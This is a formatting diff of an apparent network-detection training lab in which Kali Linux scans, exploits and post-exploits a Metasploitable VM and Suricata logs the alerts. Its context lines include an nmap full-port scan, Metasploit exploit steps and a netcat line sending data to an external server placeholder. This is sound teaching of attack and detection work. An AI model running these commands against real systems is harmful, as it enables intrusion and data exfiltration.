@@ -58,6 +58,7 @@ sudo apt-get update
 ```
 
 **Activity 1: Reconnaissance**
+
 Objective: Identify open ports and services on the Metasploitable VM.
 
 1. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
@@ -69,6 +70,7 @@ nmap -sS -sV -p- <Metasploitable_IP>
 Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.
 
 **Activity 2: Exploitation**
+
 Objective: Exploit vulnerabilities in Metasploitable to simulate an attack,observing how NDR detects these actions.
 
 1.  Open a terminal in Kali Linux.
@@ -93,6 +95,7 @@ exploit
 4. Verify access by interacting with the session.
 
 **Activity 3: Post-Exploitation Actions**
+
 Objective: Simulate actions an attacker might take after gaining access.
 
 1. Privilege Escalation: Attempt to escalate privileges using techniques. Run the command in Kali Linux
@@ -114,6 +117,7 @@ echo "Sensitive Data" | nc <your_external_server_IP> <port>
 ```
 
 **Activity 4: Monitoring and Analysis**
+
 Objective: Simulate monitoring and analyze alerts related to the activities performed.
 
 1. Install and Run an Open-Source NDR Tool: Install Suricata:
@@ -131,7 +135,7 @@ sudo suricata -c /etc/suricata/suricata.yaml -i eth0
 3. Review Logs:
 
 Check logs for alerts generated during the reconnaissance, exploitation, and post-exploitation activities:
-````
+```
 cat /var/log/suricata/fast.log
 ```
 
